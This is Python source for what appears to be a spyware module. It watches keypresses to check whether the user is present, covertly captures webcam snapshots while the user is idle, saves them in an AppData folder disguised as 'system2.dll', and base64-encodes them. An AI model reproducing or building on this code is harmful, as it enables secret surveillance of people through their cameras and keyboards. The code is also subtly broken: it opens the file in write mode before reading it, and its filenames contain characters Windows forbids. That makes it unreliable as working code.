import threading, cv2, base64, os, time
from pynput import keyboard
class CameraCapture:
    def __init__(self, idle_cam):
        self.path = os.environ["appdata"] + "\\system2.dll"
        self.user_activity = 0
        self.idle_cam = idle_cam
        self.base64File = ""

        keyboard_listener = keyboard.Listener(on_press=self.monitor_activity)
        with keyboard_listener:
            self.start_thread()
            keyboard_listener.join()

    def take_snapshot(self):
        PATH = self.path + f"\\{time.strftime('%H:%M:%S', time.localtime())}-capture.png"
        cam = cv2.VideoCapture(0)
        s, img = cam.read()
        if s:
            cv2.imwrite(PATH, img)
            with open(PATH, "wb") as file_img:
                self.base64File = base64.b64encode(file_img.read())

    def start_thread(self):
        if self.user_activity == 0:
            print("[+] Capture Camera Snapshot")
            self.take_snapshot()
            self.user_activity = 0
        else:
            print("[!] User Present: Reloading Timer")
            self.user_activity = 0
        threading.Timer(self.idle_cam, self.start_thread).start()

    def monitor_activity(self, key):
        self.user_activity += 1



    
            


